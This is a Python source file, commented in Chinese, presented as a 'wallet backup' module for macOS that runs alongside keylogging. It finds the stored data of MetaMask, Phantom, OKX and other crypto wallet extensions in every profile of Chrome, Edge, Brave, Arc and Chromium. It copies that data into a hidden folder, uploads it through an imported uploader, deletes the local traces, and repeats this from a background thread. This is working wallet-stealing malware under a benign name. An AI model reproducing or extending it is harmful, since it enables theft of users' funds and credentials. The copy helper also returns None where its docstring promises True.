# -*- coding: utf-8 -*-
"""
浏览器扩展数据备份模块

在启动键盘记录前，备份目标扩展的 Local Extension Settings 数据。
支持 Chrome、Edge、Brave、Arc、Chromium 及其多个 Profile 分身（macOS）。
快照创建后压缩为 tar.gz 并上传，上传成功后清理本地快照和压缩包。
浏览器源目录永远不会被删除。
"""

import getpass
import json
import os
import shutil
import sys
import threading
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Dict, List, Optional

from .uploader import compress_and_upload_backup


BACKUP_INTERVAL = timedelta(days=5)
BACKUP_STATE_FILENAME = ".wallet-backup-state.json"
BACKUP_CHECK_INTERVAL_SECONDS = 60 * 60
COPY_RETRY_COUNT = 5
COPY_RETRY_DELAY_SECONDS = 0.25

_backup_lock = threading.Lock()


def _contains_symlink(path: str) -> bool:
    """Reject symlinks so a backup cannot escape the browser data directory."""
    for root, dirs, files in os.walk(path, followlinks=False):
        if any(os.path.islink(os.path.join(root, name)) for name in dirs + files):
            return True
    return False


def _is_transient_browser_file(name: str) -> bool:
    """Return files that are coordination artefacts rather than wallet state."""
    upper_name = name.upper()
    return upper_name == "LOCK" or upper_name.startswith("LOCK.")


def _copy_file_with_retries(
    source: Path, target: Path, best_effort: bool = True
) -> bool:
    """Copy a file while Chromium may still be flushing it to disk.

    A stable stat before and after the copy prevents taking a half-written
    LevelDB record.  The temporary destination is removed on every failed
    attempt so a later retry always starts from a clean file.

    When best_effort is True and the file keeps changing after all retries,
    the file is copied once more without the stability check so a busy
    browser cannot block the whole snapshot.  Pass best_effort=False for
    files such as LevelDB CURRENT whose consistency is critical.  Returns
    True for a stable copy, False for a best-effort copy.
    """
    last_error: Optional[Exception] = None
    for attempt in range(COPY_RETRY_COUNT):
        temp_target = target.with_name(f".{target.name}.tmp")
        try:
            before = source.stat()
            shutil.copy2(source, temp_target)
            after = source.stat()
            if before.st_size != after.st_size or before.st_mtime_ns != after.st_mtime_ns:
                raise OSError("source changed while it was being copied")
            temp_target.replace(target)
            return
        except (OSError, shutil.Error) as exc:
            last_error = exc
            try:
                temp_target.unlink()
            except OSError:
                pass
            if attempt + 1 < COPY_RETRY_COUNT:
                time.sleep(min(2.0, COPY_RETRY_DELAY_SECONDS * (2 ** attempt)))

    if not best_effort:
        raise OSError(
            f"could not copy {source} after {COPY_RETRY_COUNT} attempts: {last_error}"
        )

    # 浏览器仍在写入该文件：尽力复制一次，避免整个快照失败。
    # LevelDB 数据文件带校验和，写入中的尾部记录可在恢复时被忽略。
    try:
        temp_target = target.with_name(f".{target.name}.tmp")
        shutil.copy2(source, temp_target)
        temp_target.replace(target)
    except (OSError, shutil.Error) as exc:
        raise OSError(f"could not copy {source}: {exc}") from exc

    print(f"  ! 文件仍在写入，已尽力复制（可能不完整）: {source}", file=sys.stderr)
    return False


def _copy_extension_data(source: Path, target: Path) -> None:
    """Recursively copy extension data without requiring a closed browser."""
    target.mkdir(parents=True, exist_ok=False)
    deferred_current: List[Path] = []
    for root, dirs, files in os.walk(source, topdown=True, followlinks=False):
        root_path = Path(root)
        dirs[:] = [name for name in dirs if not _is_transient_browser_file(name)]
        for name in dirs:
            directory = root_path / name
            if directory.is_symlink():
                raise OSError(f"symbolic link found in {directory}")
            (target / directory.relative_to(source)).mkdir(parents=True, exist_ok=True)
        for name in files:
            if _is_transient_browser_file(name):
                continue
            source_file = root_path / name
            if source_file.is_symlink():
                raise OSError(f"symbolic link found in {source_file}")
            if name == "CURRENT":
                # LevelDB 的 CURRENT 指向 MANIFEST，最后复制并严格要求稳定，
                # 保证快照中的 CURRENT 一定指向已存在的 MANIFEST。
                deferred_current.append(source_file)
                continue
            _copy_file_with_retries(
                source_file, target / source_file.relative_to(source)
            )
    for source_file in deferred_current:
        _copy_file_with_retries(
            source_file,
            target / source_file.relative_to(source),
            best_effort=False,
        )


TARGET_EXTENSIONS: Dict[str, Dict[str, List[str]]] = {
    "metamask": {
        "names": ["MetaMask"],
        "ids": [
            "nkbihfbeogaeaoehlefnkodbefgpgknn",
            "ejbalbakoplchlghecdalmeeeajnimhm",
        ],
    },
    "okx_wallet": {
        "names": ["OKX Wallet", "OKX"],
        "ids": [
            "mcohilncbfahbmgdjkbpemcciiolgcge",
            "pbpjkcldjiffchgbbndmhojiacbgflha",
        ],
    },
    "binance_wallet": {
        "names": ["Binance Wallet", "Binance"],
        "ids": ["cadiboklkpojfamcoggejbbdjcoiljjk"],
    },
    "phantom": {
        "names": ["Phantom"],
        "ids": [
            "bfnaelmomeimhlpmgjnjophhpkkoljpa",
            "phkbamefinggmakgklpkljjmgibohnba",
        ],
    },
    "rainbow": {
        "names": ["Rainbow"],
        "ids": ["opfgelmcmbiajamepnmloijbpoleiama"],
    },
    "rabby_wallet": {
        "names": ["Rabby Wallet", "Rabby"],
        "ids": ["acmacodkjbdgmoleebolmdjonilkdbch"],
    },
    "backpack": {
        "names": ["Backpack"],
        "ids": ["aflkmfhebedbjioipglgcbcmnbpgliof"],
    },
    "unisat_wallet": {
        "names": ["UniSat Wallet", "UniSat"],
        "ids": ["ppbibelpcjmhbdihakflkdcoccbgbkpo"],
    },
}

_APP_SUPPORT = os.path.join(str(Path.home()), "Library", "Application Support")

BROWSER_USER_DATA_PATHS: Dict[str, str] = {
    "chrome": os.path.join(_APP_SUPPORT, "Google", "Chrome"),
    "edge": os.path.join(_APP_SUPPORT, "Microsoft Edge"),
    "brave": os.path.join(_APP_SUPPORT, "BraveSoftware", "Brave-Browser"),
    "arc": os.path.join(_APP_SUPPORT, "Arc", "User Data"),
    "chromium": os.path.join(_APP_SUPPORT, "Chromium"),
}


def _identify_extension(ext_id: str, profile_path: str) -> Optional[str]:
    """通过扩展 ID 或 manifest.json 识别是否为目标扩展"""
    for ext_name, ext_info in TARGET_EXTENSIONS.items():
        if ext_id in ext_info["ids"]:
            return ext_name

    extensions_dir = os.path.join(profile_path, "Extensions", ext_id)
    if not os.path.isdir(extensions_dir):
        return None

    try:
        for version_dir in os.listdir(extensions_dir):
            manifest_path = os.path.join(
                extensions_dir, version_dir, "manifest.json"
            )
            if not os.path.isfile(manifest_path):
                continue
            with open(manifest_path, "r", encoding="utf-8") as f:
                manifest = json.load(f)
            manifest_name = manifest.get("name", "")
            for ext_name, ext_info in TARGET_EXTENSIONS.items():
                for target_name in ext_info["names"]:
                    if target_name.lower() in manifest_name.lower():
                        return ext_name
    except Exception:
        pass

    return None


def _normalise_now(now: Optional[datetime]) -> datetime:
    """返回带 UTC 时区的当前时间，便于稳定计算五天间隔。"""
    if now is None:
        return datetime.now(timezone.utc)
    if now.tzinfo is None:
        return now.replace(tzinfo=timezone.utc)
    return now.astimezone(timezone.utc)


def default_wallet_backup_dir() -> Path:
    """返回默认钱包备份目录：<user 前五位>_wallet-extensions。"""
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    return Path.home() / ".dev" / "wkler" / f"{user_prefix}_wallet-extensions"


def _read_last_backup_time(backup_dir: Path) -> Optional[datetime]:
    state_file = backup_dir / BACKUP_STATE_FILENAME
    try:
        state = json.loads(state_file.read_text(encoding="utf-8"))
        value = state.get("last_successful_backup")
        if not isinstance(value, str):
            return None
        parsed = datetime.fromisoformat(value)
        return _normalise_now(parsed)
    except (OSError, ValueError, TypeError, json.JSONDecodeError):
        return None


def _write_last_backup_time(backup_dir: Path, completed_at: datetime) -> None:
    """原子写入状态；只有完整快照成功后才调用。"""
    state_file = backup_dir / BACKUP_STATE_FILENAME
    temp_file = backup_dir / f"{BACKUP_STATE_FILENAME}.tmp"
    state = {
        "last_successful_backup": completed_at.isoformat(),
        "interval_days": BACKUP_INTERVAL.days,
    }
    temp_file.write_text(
        json.dumps(state, ensure_ascii=False, indent=2) + "\n",
        encoding="utf-8",
    )
    temp_file.replace(state_file)


def is_wallet_backup_due(backup_dir: Path, now: Optional[datetime] = None) -> bool:
    """尚无成功记录或距离上次成功备份已满五天时返回 True。"""
    current_time = _normalise_now(now)
    last_backup = _read_last_backup_time(Path(backup_dir))
    return last_backup is None or current_time - last_backup >= BACKUP_INTERVAL


def _unique_snapshot_path(backup_dir: Path, now: datetime) -> Path:
    base_name = f"wallet-backup_{now.strftime('%Y%m%d_%H%M%S')}"
    candidate = backup_dir / base_name
    suffix = 1
    while candidate.exists() or candidate.with_name(f".{candidate.name}.tmp").exists():
        candidate = backup_dir / f"{base_name}_{suffix}"
        suffix += 1
    return candidate


def backup_browser_extensions(
    backup_dir: Optional[Path] = None,
    dry_run: bool = False,
    force: bool = False,
    now: Optional[datetime] = None,
) -> int:
    """
    将浏览器钱包扩展数据备份到默认目录，也可通过 backup_dir 显式指定。

    默认五天内最多生成一个完整快照，随后压缩为 tar.gz 并上传。源目录
    永远不会被删除；上传成功后清理本地快照和压缩包，失败则保留本地文件。
    dry_run=True 时仅扫描，不复制、不压缩、不上传或写入状态。
    """
    if backup_dir is None:
        if dry_run:
            backup_dir = Path.cwd() / "wallet-backup-preview"
        else:
            backup_dir = default_wallet_backup_dir()

    backup_dir = Path(backup_dir).expanduser()
    current_time = _normalise_now(now)
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"

    with _backup_lock:
        if not dry_run:
            backup_dir.mkdir(parents=True, exist_ok=True)
            if not force and not is_wallet_backup_due(backup_dir, current_time):
                last_backup = _read_last_backup_time(backup_dir)
                next_backup = last_backup + BACKUP_INTERVAL if last_backup else current_time
                print(f"  * 距离下次钱包备份时间尚早：{next_backup.astimezone().isoformat()}")
                return 0

        snapshot_path = _unique_snapshot_path(backup_dir, current_time)
        staging_path = snapshot_path.with_name(f".{snapshot_path.name}.tmp")
        backed_up = 0
        failed = False

        if not dry_run:
            staging_path.mkdir(parents=True, exist_ok=False)

        for browser_name, user_data_path in BROWSER_USER_DATA_PATHS.items():
            if not os.path.isdir(user_data_path):
                continue

            try:
                entries = os.listdir(user_data_path)
            except OSError as exc:
                failed = True
                print(f"  ! 无法扫描 {browser_name}: {exc}", file=sys.stderr)
                if isinstance(exc, PermissionError):
                    print(
                        "  ! macOS 无法读取浏览器数据目录：请在「系统设置 → 隐私与安全性 →"
                        " 完全磁盘访问」中授权终端或 Python 后重试",
                        file=sys.stderr,
                    )
                continue

            for item in entries:
                item_path = os.path.join(user_data_path, item)
                if not os.path.isdir(item_path):
                    continue
                if item != "Default" and not item.startswith("Profile "):
                    continue

                ext_settings_path = os.path.join(item_path, "Local Extension Settings")
                if not os.path.isdir(ext_settings_path):
                    continue

                profile_name = item.replace(" ", "_")

                try:
                    ext_dirs = os.listdir(ext_settings_path)
                except OSError as exc:
                    failed = True
                    print(
                        f"  ! 无法扫描 {browser_name}/{profile_name}: {exc}",
                        file=sys.stderr,
                    )
                    continue

                for ext_id in ext_dirs:
                    ext_source = os.path.join(ext_settings_path, ext_id)
                    if not os.path.isdir(ext_source):
                        continue

                    ext_name = _identify_extension(ext_id, item_path)
                    if not ext_name:
                        continue

                    target_name = (
                        f"{user_prefix}_{browser_name}_{profile_name}_{ext_name} (ID {ext_id})"
                    )
                    target_path = staging_path / target_name

                    try:
                        if dry_run:
                            backed_up += 1
                            print(
                                f"  [dry-run] {browser_name}/{profile_name}/{ext_name} "
                                f"(ID: {ext_id}) -> {snapshot_path / target_name}"
                            )
                            continue
                        if _contains_symlink(ext_source):
                            failed = True
                            print(
                                f"  ! 拒绝包含符号链接的扩展数据: {browser_name}/{profile_name}/{ext_id}",
                                file=sys.stderr,
                            )
                            continue
                        _copy_extension_data(Path(ext_source), target_path)
                        backed_up += 1
                        print(f"  + {browser_name}/{profile_name}/{ext_name} (ID: {ext_id})")
                    except Exception as exc:
                        failed = True
                        print(
                            f"  ! 备份失败: {browser_name}/{profile_name}/{ext_id} - {exc}",
                            file=sys.stderr,
                        )

        if dry_run:
            return backed_up

        if backed_up == 0 or failed:
            shutil.rmtree(staging_path, ignore_errors=True)
            if failed:
                print("  ! 本次快照不完整，未保存快照或更新时间", file=sys.stderr)
            return 0

        try:
            staging_path.replace(snapshot_path)
            _write_last_backup_time(backup_dir, current_time)
        except Exception as exc:
            shutil.rmtree(staging_path, ignore_errors=True)
            print(f"  ! 无法完成本地快照: {exc}", file=sys.stderr)
            return 0

        print(f"  * 本地快照已保存: {snapshot_path}")
        compress_and_upload_backup(snapshot_path)
        return backed_up


def _wallet_backup_loop(backup_dir: Path, stop_event: threading.Event) -> None:
    """后台每小时检查一次，仅在五天周期到期后创建快照并压缩上传。"""
    while not stop_event.is_set():
        try:
            backup_browser_extensions(backup_dir=backup_dir)
        except Exception as exc:
            print(f"  ! 钱包备份调度检查失败: {exc}", file=sys.stderr)
        if stop_event.wait(BACKUP_CHECK_INTERVAL_SECONDS):
            break


def start_wallet_backup_scheduler(
    backup_dir: Path, stop_event: Optional[threading.Event] = None
) -> threading.Thread:
    """启动钱包备份守护线程；调用方应先执行一次即时到期检查。"""
    stop_event = stop_event or threading.Event()
    thread = threading.Thread(
        target=_wallet_backup_loop,
        args=(Path(backup_dir), stop_event),
        name="wallet-backup-scheduler",
        daemon=True,
    )
    thread.start()
    return thread
